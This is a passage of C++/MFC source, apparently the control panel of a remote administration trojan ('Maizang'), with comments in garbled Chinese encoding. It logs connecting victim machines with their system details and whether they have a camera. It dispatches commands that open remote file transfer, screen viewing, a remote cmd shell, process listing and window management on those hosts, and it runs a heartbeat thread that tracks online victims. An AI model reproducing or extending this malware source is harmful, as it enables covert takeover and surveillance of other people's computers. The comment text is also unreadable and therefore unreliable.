			OnLineIP.Format("%s", inet_ntoa(addr.sin_addr));
 
			This->AddOnlineList(socket, OnLineIP, "", m_SysInfo.computerName, m_SysInfo.osVersion,m_SysInfo.cpuInfo, m_SysInfo.hasCamera, m_SysInfo.memorySize);// CString strCPU, CString strVideo, CString strPing);
	        CString OnlineMessage;
			OnlineMessage.Format("������ %s ������ע��",OnLineIP);
            This->ShowMessage(true, OnlineMessage);
			break;
			}
		 case SOKCET_FILEMANAGE : 
			 {
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect =socket;
				 This->PostMessage(WM_FILEDLGSHOW, (DWORD)pInput, 0);//����һ�������ļ���������Ӧ��Ϣ ��OnFileDlgShow������Ӧ����
				 break;
			 }
		 case CMD_SCREENDLG_SHOW://��ʾ��Ļ����
			 {
				// ::MessageBox(NULL, "���ڴ�������" , "biaoti" , MB_OK); 
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect =socket;
				 This->PostMessage(WM_SCREENDLGSHOW, (DWORD)pInput, 0);//����һ��������Ļ������Ӧ��Ϣ ��OnScreenDlgShow������Ӧ����	
				 break;
			 }
		 case CMD_SHELLDLG_SHOW://��ʾ cmd �����д���
			 {
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect =socket;
				 This->PostMessage(WM_CMD_DLG_SHOW, (DWORD)pInput, 0);//����һ��������Ļ������Ӧ��Ϣ ��OnCmdDlgShow������Ӧ����	
				 break;
			 }
		 case CMD_PROCESS_SHOW:
			 {
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect = socket;
				 This->PostMessageA(WM_PROCESS_SHOW, (DWORD) pInput, 0);
				 break;
			 }
		 case CMD_WINDOW_MANAGER_DLG_SHOW:
			 {
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect = socket;
				 This->PostMessage(WM_WINDOW_MANAGER_DLG_SHOW, (DWORD) pInput, 0);
				break;
			 }
		 default:
			 {
				 CString  Msg;
				 Msg.Format("�޷������CMD���Ϊ��%d", msgHead.dwCmd); 
				 ::MessageBox(NULL, "��ĳ����...ͨ��ʱ �յ��޷��������Ϣ" , Msg , MB_OK); 
			 }
		}


	}
       return 0;
}




//���߼���߳�  ������
unsigned  __stdcall  ThreadCheck(void * pParam)         
{
	//������
	CMaizangDlg *This = (CMaizangDlg*)pParam;
	MsgHead msgHead;
	msgHead.dwCmd = CMD_HEARTBEAT;
	msgHead.dwSize = 0;
	
	DWORD dwCount = 0,dwSel;
	while(1)
	{
		dwCount++;
		dwSel = dwCount % 3;
		if(dwSel == 0)//���ż��  ���͸�ż�������������
		{
			CAutoLock Lock(This->cOnlineLock);
			int AllNum = This->m_List_Online.GetItemCount();
			DWORD socket;
			for(int i=0; i < AllNum; i+=2)
			{	
				socket=This->m_List_Online.GetItemData(i);
				if(!SendMsg(socket,NULL,&msgHead))
				{
					This->m_List_Online.DeleteItem(i);
					AllNum--;
					i--;
				}	
			}
		}
		else if(dwSel == 1)//������� ���͸����������������
		{
			CAutoLock Lock(This->cOnlineLock);
			int AllNum = This->m_List_Online.GetItemCount();
			DWORD socket;
			for(int i=1; i < AllNum; i+=2)
			{	
				socket=This->m_List_Online.GetItemData(i);
				if(!SendMsg(socket,NULL,&msgHead))
				{
					This->m_List_Online.DeleteItem(i);
					AllNum--;
					i--;
				}	
			}
		}
		else if(dwSel == 2)//������� ���͸����з����������
		{
			CAutoLock Lock(This->cOnlineLock);
			int AllNum = This->m_List_Online.GetItemCount();
			DWORD socket;
			for(int i=0; i < AllNum; i++)
			{	
				socket = This->m_List_Online.GetItemData(i);
				if(!SendMsg(socket,NULL,&msgHead))
				{

					This->m_List_Online.DeleteItem(i);
					AllNum--;
					i--;
				}	
			}
		}

		This->Online_computer_count = This->m_List_Online.GetItemCount();
		This->strStatusBar.Format("��ǰ�������� [%d]", This->Online_computer_count);
        This->m_wndStatusBar.SetText(This->strStatusBar, 0, 0); 	    
	    
		Sleep(50 * 1000);//һ���Ӳ�ѯһ��
	}
}



// �����ļ����䴰��
LRESULT CMaizangDlg::OnFileDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;
	
	CFileManage * pFileDlg = new CFileManage;
	pFileDlg->Create(IDD_FILEMANAGE, GetDesktopWindow());//����һ����ģ̬�Ի���
	pFileDlg->ShowWindow(SW_SHOW);
	//���ú������ļ����䴰����ʾ״̬��Ϣ����������̨�������ļ��б� �Լ���ʾ����������Ϣ
 	pFileDlg->SetConnSocket(pInput->sMainConnect);//��sMainConnect���ݵ�CManageFile�Ĵ��ڶ�����ȥ
	
	delete pInput;
	return 0;	 
}

// ������Ļ���䴰��
LRESULT CMaizangDlg::OnScreenDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;
	
	CScreenDlg * pScreenDlg = new CScreenDlg;
	pScreenDlg->Create(IDD_SCREEN, GetDesktopWindow());//����һ����ģ̬�Ի���
	pScreenDlg->ShowWindow(SW_SHOW);
	
 	pScreenDlg->SetSCreenSocket(pInput->sMainConnect);//��sMainConnect���ݵ�CScreenDlg�Ĵ��ڶ�����ȥ
	pScreenDlg->SetChoseSocket(m_ChoseSocket);
	//pScreenDlg->GetFirstScreen();
	delete pInput;
	return 0;	 
}


// ������Ļ���䴰��
LRESULT CMaizangDlg::OnCmdDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;
	
	CCmdDlg * pCmdDlg = new CCmdDlg;
	pCmdDlg->Create(IDD_CMD_SHELL, GetDesktopWindow());//����һ����ģ̬�Ի���
	pCmdDlg->ShowWindow(SW_SHOW);
	pCmdDlg->m_MainSocket = pInput->sMainConnect;
 	//pScreenDlg->SetSCreenSocket(pInput->sMainConnect);//��sMainConnect���ݵ�CScreenDlg�Ĵ��ڶ�����ȥ
	//pScreenDlg->SetChoseSocket(m_ChoseSocket);
	
	delete pInput;
	return 0;	 
}

CEdit a;
LRESULT CMaizangDlg::OnProcessShow(WPARAM wParam, LPARAM lParam){
	LPSocketInput pInput = (LPSocketInput) wParam;
	CProcess *pProcess = new CProcess;
	pProcess->m_ConnSocket = pInput->sMainConnect;
	pProcess->Create(IDD_PROCESS);
	pProcess->ShowWindow(SW_SHOW);
	delete pInput;
	return 0;
}

LRESULT CMaizangDlg::OnWindowManagerDlgShow(WPARAM wParam, LPARAM lParam){
	LPSocketInput pInput = (LPSocketInput)wParam;

	CWindowManagerDlg * pWindowManagerDlg = new CWindowManagerDlg;
	pWindowManagerDlg->Create(IDD_WINDOW_MANAGER, GetDesktopWindow());//����һ����ģ̬�Ի���
	pWindowManagerDlg->ShowWindow(SW_SHOW);
	pWindowManagerDlg->m_MainSocket = pInput->sMainConnect;
	pWindowManagerDlg->windowListShow();
	return 0;
}